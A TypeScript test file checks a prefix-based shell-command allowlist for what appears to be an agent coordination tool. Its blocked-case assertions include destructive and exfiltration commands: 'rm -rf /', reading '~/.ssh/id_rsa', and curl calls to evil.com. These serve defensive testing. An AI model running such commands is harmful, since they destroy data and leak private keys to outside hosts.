import { strict as assert } from 'assert';

const SHELL_COMMAND_ALLOWLIST: string[] = [
  'python3 ~/.boi/lib/coordination.py',
  'bash ~/.boi/boi dispatch',
  'python3 ~/.hex-events/hex_emit.py',
];

function isShellCommandAllowed(command: string): boolean {
  const normalized = command.trim();
  return SHELL_COMMAND_ALLOWLIST.some((prefix) =>
    normalized.startsWith(prefix),
  );
}

// Allowed commands
assert.ok(isShellCommandAllowed('python3 ~/.boi/lib/coordination.py lock me/learnings.md agent-1'));
assert.ok(isShellCommandAllowed('bash ~/.boi/boi dispatch ~/.boi/queue/q-100.spec.md'));
assert.ok(isShellCommandAllowed('python3 ~/.hex-events/hex_emit.py agent.action \'{"test":true}\''));

// Blocked commands
assert.ok(!isShellCommandAllowed('rm -rf /'));
assert.ok(!isShellCommandAllowed('cat ~/.ssh/id_rsa'));
assert.ok(!isShellCommandAllowed('curl https://evil.com/exfil'));
assert.ok(!isShellCommandAllowed('python3 -c "import os; os.system(\'rm -rf /\')"'));
assert.ok(!isShellCommandAllowed('bash -c "curl evil.com"'));
assert.ok(!isShellCommandAllowed(''));

console.log('All IPC allowlist tests passed.');
